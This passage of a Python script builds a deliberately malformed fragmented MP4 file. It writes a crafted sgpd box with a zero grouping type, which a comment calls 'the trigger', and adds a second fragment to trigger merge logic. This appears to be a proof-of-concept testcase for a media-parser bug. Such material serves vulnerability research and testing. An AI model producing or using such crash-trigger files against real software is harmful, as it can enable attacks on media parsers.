II\', 0x01400000, 0x00F00000)\n    return write_box(\'tkhd\', data, version=0, flags=0x7)\n\ndef write_mdhd():\n    """Write mdhd box"""\n    data = struct.pack(\'>IIIIHH\', 0, 0, 1000, 1000, 0x55c4, 0)\n    return write_box(\'mdhd\', data, version=0, flags=0)\n\ndef write_hdlr():\n    """Write hdlr box for video"""\n    data = struct.pack(\'>I4s4sIII\', 0, b\'\\x00\\x00\\x00\\x00\', b\'vide\', 0, 0, 0)\n    data += b\'VideoHandler\\x00\'\n    return write_box(\'hdlr\', data, version=0, flags=0)\n\ndef write_vmhd():\n    """Write vmhd box"""\n    data = struct.pack(\'>HHHH\', 0, 0, 0, 0)\n    return write_box(\'vmhd\', data, version=0, flags=1)\n\ndef write_dref():\n    """Write dref box"""\n    url_data = write_box(\'url \', b\'\', version=0, flags=1)\n    data = struct.pack(\'>I\', 1) + url_data\n    return write_box(\'dref\', data, version=0, flags=0)\n\ndef write_stsd():\n    """Write stsd box with avc1 sample entry"""\n    avc1_data = struct.pack(\'>6sH\', b\'\\x00\' * 6, 1)\n    avc1_data += struct.pack(\'>HHHH\', 0, 0, 0, 0)\n    avc1_data += struct.pack(\'>IIHH\', 0, 0, 320, 240)\n    avc1_data += struct.pack(\'>IIII\', 0x00480000, 0x00480000, 0, 1)\n    avc1_data += b\'\\x00\' * 32\n    avc1_data += struct.pack(\'>HH\', 0x0018, 0xFFFF)\n    \n    avc1_box = write_box(\'avc1\', avc1_data)\n    data = struct.pack(\'>I\', 1) + avc1_box\n    return write_box(\'stsd\', data, version=0, flags=0)\n\ndef write_stts():\n    """Write stts box"""\n    data = struct.pack(\'>I\', 0)\n    return write_box(\'stts\', data, version=0, flags=0)\n\ndef write_stsc():\n    """Write stsc box"""\n    data = struct.pack(\'>I\', 0)\n    return write_box(\'stsc\', data, version=0, flags=0)\n\ndef write_stsz():\n    """Write stsz box"""\n    data = struct.pack(\'>II\', 0, 0)\n    return write_box(\'stsz\', data, version=0, flags=0)\n\ndef write_stco():\n    """Write stco box"""\n    data = struct.pack(\'>I\', 0)\n    return write_box(\'stco\', data, version=0, flags=0)\n\ndef write_stbl():\n    """Write stbl box"""\n    stbl_data = write_stsd() + write_stts() + write_stsc() + write_stsz() + write_stco()\n    return write_box(\'stbl\', stbl_data)\n\ndef write_minf():\n    """Write minf box"""\n    dinf_data = write_dref()\n    dinf = write_box(\'dinf\', dinf_data)\n    minf_data = write_vmhd() + dinf + write_stbl()\n    return write_box(\'minf\', minf_data)\n\ndef write_mdia():\n    """Write mdia box"""\n    mdia_data = write_mdhd() + write_hdlr() + write_minf()\n    return write_box(\'mdia\', mdia_data)\n\ndef write_trak():\n    """Write trak box"""\n    trak_data = write_tkhd() + write_mdia()\n    return write_box(\'trak\', trak_data)\n\ndef write_trex():\n    """Write trex box"""\n    data = struct.pack(\'>IIIII\', 1, 1, 0, 0, 0)\n    return write_box(\'trex\', data, version=0, flags=0)\n\ndef write_mvex():\n    """Write mvex box"""\n    mvex_data = write_trex()\n    return write_box(\'mvex\', mvex_data)\n\ndef write_moov():\n    """Write moov box"""\n    moov_data = write_mvhd() + write_trak() + write_mvex()\n    return write_box(\'moov\', moov_data)\n\ndef write_mfhd(sequence_number):\n    """Write mfhd box"""\n    data = struct.pack(\'>I\', sequence_number)\n    return write_box(\'mfhd\', data, version=0, flags=0)\n\ndef write_tfhd():\n    """Write tfhd box"""\n    flags = 0x020000  # default-base-is-moof\n    data = struct.pack(\'>I\', 1)  # track_ID\n    return write_box(\'tfhd\', data, version=0, flags=flags)\n\ndef write_sgpd_v1(grouping_type, entry_count, entries):\n    """\n    Write sgpd box version 1 with specified grouping type and entries\n    """\n    version = 1\n    flags = 0\n    default_length = 0  # Set to 0 to trigger per-entry length reading\n    \n    data = struct.pack(\'>III\', grouping_type, default_length, entry_count)\n    \n    for entry_data in entries:\n        # For version 1 with default_length=0, each entry has its own length\n        data += struct.pack(\'>I\', len(entry_data))\n        data += entry_data\n    \n    return write_box(\'sgpd\', data, version=version, flags=flags)\n\ndef write_sgpd_malformed():\n    """\n    Write a malformed sgpd box with grouping_type that might cause issues\n    Create an sgpd with a crafted grouping_type and entry structure\n    """\n    # Use a non-standard grouping type that will be treated as default\n    grouping_type = 0x00000000  # Zero grouping type - this is the trigger!\n    version = 1\n    flags = 0\n    default_length = 0\n    entry_count = 2\n    \n    # Create entries with specific structure\n    entry1 = b\'\\x00\' * 16  # Crafted entry data\n    entry2 = b\'\\xFF\' * 16\n    \n    data = struct.pack(\'>III\', grouping_type, default_length, entry_count)\n    data += struct.pack(\'>I\', len(entry1)) + entry1\n    data += struct.pack(\'>I\', len(entry2)) + entry2\n    \n    return write_box(\'sgpd\', data, version=version, flags=flags)\n\ndef write_sbgp(grouping_type):\n    """Write sbgp box"""\n    entry_count = 1\n    \n    data = struct.pack(\'>II\', grouping_type, entry_count)\n    data += struct.pack(\'>II\', 1, 1)\n    \n    return write_box(\'sbgp\', data, version=0, flags=0)\n\ndef write_trun():\n    """Write trun box"""\n    flags = 0x000001\n    sample_count = 1\n    data_offset = 100\n    \n    data = struct.pack(\'>Ii\', sample_count, data_offset)\n    return write_box(\'trun\', data, version=0, flags=flags)\n\ndef write_traf_malformed():\n    """Write traf box with malformed sgpd"""\n    traf_data = write_tfhd()\n    traf_data += write_sgpd_malformed()  # Malformed sgpd with grouping_type=0\n    traf_data += write_sbgp(0x00000000)  # Matching sbgp\n    traf_data += write_trun()\n    return write_box(\'traf\', traf_data)\n\ndef write_traf_normal():\n    """Write normal traf box with roll grouping"""\n    traf_data = write_tfhd()\n    # Normal roll entry\n    roll_entry = struct.pack(\'>h\', -1)\n    traf_data += write_sgpd_v1(0x726f6c6c, 1, [roll_entry])  # \'roll\'\n    traf_data += write_sbgp(0x726f6c6c)\n    traf_data += write_trun()\n    return write_box(\'traf\', traf_data)\n\ndef write_moof(sequence_number, use_malformed=False):\n    """Write moof box"""\n    moof_data = write_mfhd(sequence_number)\n    if use_malformed:\n        moof_data += write_traf_malformed()\n    else:\n        moof_data += write_traf_normal()\n    return write_box(\'moof\', moof_data)\n\ndef write_mdat():\n    """Write minimal mdat box"""\n    mdat_data = b\'\\x00\' * 100\n    return write_box(\'mdat\', mdat_data)\n\ndef generate_mp4():\n    """Generate the complete malformed MP4"""\n    mp4_data = b\'\'\n    mp4_data += write_ftyp()\n    mp4_data += write_moov()\n    # First fragment with malformed sgpd (grouping_type=0)\n    mp4_data += write_moof(1, use_malformed=True)\n    mp4_data += write_mdat()\n    # Second fragment to trigger merge logic\n    mp4_data += write_moof(2, use_malformed=True)\n    mp4_data += write_mdat()\n    return mp4_data\n\n# Generate and write the file\ntry:\n    mp4_data = generate_mp4()\n    with open(output_path, \'wb\') as f:\n        f.write(mp4_data)\n    print(f"[+] Generated malformed MP4 at {output_path}")\n    print(f"[+] File size: {len(mp4_data)} bytes")\nexcept Exception as e:\n    print(f"[-] Error generating testcase: {e}", file=sys.stderr)\n    sys.exit(1)\n'}
